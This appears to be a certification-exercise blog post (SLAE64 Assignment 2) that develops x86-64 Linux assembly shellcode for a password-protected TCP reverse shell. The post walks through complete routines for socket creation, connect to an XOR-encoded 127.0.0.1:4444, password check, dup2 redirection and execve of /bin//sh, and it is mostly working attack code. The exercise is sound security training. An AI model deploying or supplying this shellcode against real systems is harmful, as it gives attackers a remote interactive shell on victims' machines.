Title: SLAE64 - Assignment 2
Date: 2022-06-25T09:48:30.000Z

<h2 id="disclaimer">Disclaimer</h2><p>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification:</p><p><a href="https://www.pentesteracademy.com/course?id=7">https://www.pentesteracademy.com/course?id=7</a></p><p>Student ID: PA-30398</p><h2 id="source-code">Source Code</h2><p>The source code for this assignment is stored inside the directory: <a href="https://github.com/rbctee/SlaeExam/tree/main/slae64/assignment/2/">rbctee/SlaeExam</a>.</p><h2 id="theory">Theory</h2><p>As usual, here's a diagram that represents the logic a password-protected TCP Reverse Shell:</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="__GHOST_URL__/content/images/2022/06/image-12.png" class="kg-image" alt loading="lazy" width="227" height="666"><figcaption>Logic of a password-protected Reverse Shell</figcaption></figure><p>Once a TCP socket is created, the shellcode connects to a specific TCP listener identified by an <code>IP:PORT</code> pair.</p><p>Next, the shellcode reads the password from the client and checks whether it is correct.</p><p>After that, the program redirects input, output and error to the newly-created socket.</p><p>Finally, a shell is spawned, providing an interactive session to the attacker.</p><h2 id="implementation">Implementation</h2><h3 id="socket-creation">Socket Creation</h3><p>As mentioned during the first assignment, creating a socket is pretty straight-forward on <code>x86-64</code> Linux systems since there is a specific syscall named <code>socket</code>:</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="__GHOST_URL__/content/images/2022/06/image-9.png" class="kg-image" alt="Syscall socket on x86-64 systems" loading="lazy" width="1453" height="410" srcset="__GHOST_URL__/content/images/size/w600/2022/06/image-9.png 600w, __GHOST_URL__/content/images/size/w1000/2022/06/image-9.png 1000w, __GHOST_URL__/content/images/2022/06/image-9.png 1453w" sizes="(min-width: 720px) 720px"><figcaption>Syscall <code>socket</code> on <code>x86-64</code> systems</figcaption></figure><p>As shown in the screenshot above, the syscall <code>socket</code> accepts three arguments:</p><ol><li><em><strong>family</strong></em> is a integer specifying the family of the socket; in my  case, I'll be using <code>AF_INET</code>, i.e. the IPv4 protocol</li><li><em><strong>type</strong> </em>indicates the type of socket, for example TCP or UDP</li><li><em><strong>protocol</strong></em> refers to the protocol used for the specific type of socket; in this case there's only the TCP protocol</li></ol><p>Putting this knowledge into practice, I managed to write the following assembly code:</p><figure class="kg-card kg-code-card"><pre><code class="language-nasm">global _start

section .text

_start:

CreateSocket:

    ; clear registers for later usage
    xor esi, esi
    mul rsi

    ; 1st argument of socket(): communication domain
    ; in this case AF_INET, so it's based upon the IPv4 protocol
    push rdx
    pop rdi
    add rdi, 2
    
    ; 2nd argument of socket(): type of socket
    ; in this case: SOCK_STREAM, which means it uses the TCP protocol
    inc rsi

    ; 3rd argument: https://stackoverflow.com/questions/3735773/what-does-0-indicate-in-socket-system-call

    ; Syscall socket()
    add eax, 41

    ; create socket and save the resulting file descriptor inside RAX
    syscall</code></pre><figcaption>Creating a TCP socket in Assembly</figcaption></figure><p>In the snippet above I defined a new routine named <code>CreateSocket</code> which is responsible for creating a new TCP socket.</p><h3 id="socket-connection">Socket Connection</h3><p>Unlike a bind shell, password-protected or not, this shellcode doesn't need to call syscalls such as <em>listen</em> or <em>accept</em>, since <strong>the attacker</strong> is not going to connect to this socket.</p><p>The opposite is true: <strong>the socket </strong>is going to connect to the TCP listener set up by the attacker.</p><p>This is what allows attackers to get a shell on servers and workstations hidden by <em>NAT</em>.</p><p>To perform this operation, there's a convenient syscall named <code>connect</code> we can use:</p><figure class="kg-card kg-bookmark-card"><a class="kg-bookmark-container" href="https://man7.org/linux/man-pages/man2/connect.2.html"><div class="kg-bookmark-content"><div class="kg-bookmark-title">connect(2) - Linux manual page</div><div class="kg-bookmark-description"></div><div class="kg-bookmark-metadata"><span class="kg-bookmark-author">Linux manual page</span></div></div><div class="kg-bookmark-thumbnail"><img src="https://man7.org/tlpi/cover/TLPI-front-cover-vsmall.png" alt=""></div></a></figure><p>It accepts three arguments:</p><ol><li><em><strong>sockfd</strong> </em>is the file descriptor returned by the <code>socket</code> syscall</li><li><em><strong>addr</strong> </em>is a pointer to a sockaddr structure containing the remote address and TCP port of the attacker listener</li><li><em><strong>addrlen</strong> </em>is a integer that specifies the length of the previous sockaddr structure, usually 16-bytes long</li></ol><p>Putting this pieces of information together, I came up with the following routine:</p><figure class="kg-card kg-code-card"><pre><code class="language-nasm">Connect:

    ; 1st argument of connect(): file descriptor of the socket to connect
    mov rdi, rax

    xor esi, esi
    mul rsi

    ; padding for the sockaddr struct
    push rax

    ; address 127.0.0.1:4444
    mov rbx, 0xfeffff80a3eefffd
    mov rcx, 0xffffffffffffffff
    xor rbx, rcx

    ; push the pointer to the remote address on the stack
    push rbx
    mov rsi, rsp

    ; 3rd argument of connect(): size of the sockaddr struct
    add edx, 16

    ; syscall connect()
    add eax, 42

    ; invoke connect()
    syscall</code></pre><figcaption>Connection to the remote address <code>127.0.0.1:444</code></figcaption></figure><p>The peculiarity about the <em>sockaddr</em> structure is that it needs some padding bytes at the end, which are going to be <code>NULL</code> bytes.</p><p>For this reason, I decided to use the <strong>XOR</strong> operation in order to remove eventual <code>NULL</code> bytes from the shellcode, while still being able to add the required padding.</p><h3 id="password-protection">Password Protection</h3><p>I've already mentioned in the previous assignment that we can add password-protection by means of the syscall <code>read</code>, reading some bytes from the client and comparing them to a hard-coded password.</p><p>This means that after the attacker receives a callback on the TCP listener, they'll need to send the password before being able to execute commands on the remote system.</p><p>The following routines (<code>CheckPassword</code> and <code>ExitWrongPassword</code>) are copied from the previous assignment, so take a look at it for more information.</p><figure class="kg-card kg-code-card"><pre><code class="language-nasm">CheckPassword:

    ; 3rd argument of read(): number of bytes to read
    add rdx, 8

    ; allocate 8 bytes on the stack for storing the password
    sub rsp, rdx

    ; 2nd argument of read(): pointer to buffer which will store the
    ; bytes received from the client
    mov rsi, rsp

    ; 1st argument of read() (client socket) shoud be unchanged (RDI)

    ; syscall read()
    xor eax, eax

    ; call read()
    syscall

    pop rbx
    mov rax, 0x0a32322174636272
    xor rax, rbx
    jz IO_Redirection

ExitWrongPassword:

    xor eax, eax
    add eax, 60
    syscall</code></pre><figcaption>Routine for validating the password</figcaption></figure><h3 id="io-redirection">I/O Redirection</h3><p>Before effectively spawning a shell, you need to redirect input, output, and errors too.</p><p>This way, when the attacker send some input to the TCP listener, data will be treated as input for the spawned shell. Same thing goes for output and errors.</p><p>You can achieve this type of redirection through the syscall <code>dup2</code>:</p><figure class="kg-card kg-bookmark-card"><a class="kg-bookmark-container" href="https://man7.org/linux/man-pages/man2/dup.2.html"><div class="kg-bookmark-content"><div class="kg-bookmark-title">dup(2) - Linux manual page</div><div class="kg-bookmark-description"></div><div class="kg-bookmark-metadata"><span class="kg-bookmark-author">Linux manual page</span></div></div><div class="kg-bookmark-thumbnail"><img src="https://man7.org/tlpi/cover/TLPI-front-cover-vsmall.png" alt=""></div></a></figure><p>Follows the assembly code for this function:</p><figure class="kg-card kg-code-card"><pre><code class="language-nasm">IO_Redirection:

    xor ecx, ecx
    mul rcx
    add ecx, 2

DuplicateFileDescriptor:

    ; 1st argument of dup2(), file descriptor of the client socket, should be unchanged (RDI)
    ; 2nd argument of dup2(): file descriptor to redirect: stdin/stdout/stderr
    ; in this case the value is stored inside RCX
    ; - 2 (sterr)
    ; - 1 (stdout)
    ; - 0 (stdin)
    push rcx
    
    ; syscall: dup2()
    push rdx
    pop rax
    add eax, 33

    ; 2nd argument of dup2(): file descriptor to redirect
    mov rsi, rcx

    ; call dup2()
    syscall

    pop rcx
    dec rcx
    jns DuplicateFileDescriptor</code></pre><figcaption>Redirection of input, output, and errors</figcaption></figure><p>Overall, these routines can be converted to the C code listed below:</p><figure class="kg-card kg-code-card"><pre><code class="language-cpp">void main(int argc, char* argv[])
{
    // ...
    
    dup2(create_socket_fd, 2);
    dup2(create_socket_fd, 1);
    dup2(create_socket_fd, 0);
    
    // ...
}</code></pre><figcaption>C code for redirecting input/output/errors</figcaption></figure><h3 id="spawning-a-shell">Spawning a Shell</h3><p>The final step is to spawn a shell e.g., <code>/bin/sh</code> or <code>/bin/bash</code>. You can do so by using the syscall <code>execve</code>.</p><p>The snippet of code below is an assembly routine which does exactly this, however it uses the path <code>/bin//sh</code>, in order to avoid using <code>NULL</code> bytes in the path passed to <code>execve</code>.</p><pre><code class="language-nasm">SpawnSystemShell:

    ; clear RAX register (zero-sign extended)
    xor eax, eax

    ; NULL terminator for the string below
    push rax

    ; 3rd argument of execve: envp (in this case a pointer to NULL)
    mov rdx, rsp

    ; string "/bin//sh"
    mov rbx, 0x68732f2f6e69622f
    push rbx

    ; 1st argument of execve: executable to run
    mov rdi, rsp

    ; 2nd argument of execve: array of arguments passed to the executable
    push rax

    push rdi
    mov rsi, rsp

    ; syscall execve
    add eax, 0x3b

    ; invoke execve
    syscall
</code></pre><p>The following proof of concept demonstrates the successful creation of a password-protected reverse shell:</p><figure class="kg-card kg-image-card kg-width-wide kg-card-hascaption"><img src="__GHOST_URL__/content/images/2022/06/image-14.png" class="kg-image" alt loading="lazy" width="1884" height="527" srcset="__GHOST_URL__/content/images/size/w600/2022/06/image-14.png 600w, __GHOST_URL__/content/images/size/w1000/2022/06/image-14.png 1000w, __GHOST_URL__/content/images/size/w1600/2022/06/image-14.png 1600w, __GHOST_URL__/content/images/2022/06/image-14.png 1884w" sizes="(min-width: 1200px) 1200px"><figcaption>Password-protected Reverse Shell Proof of Concept</figcaption></figure>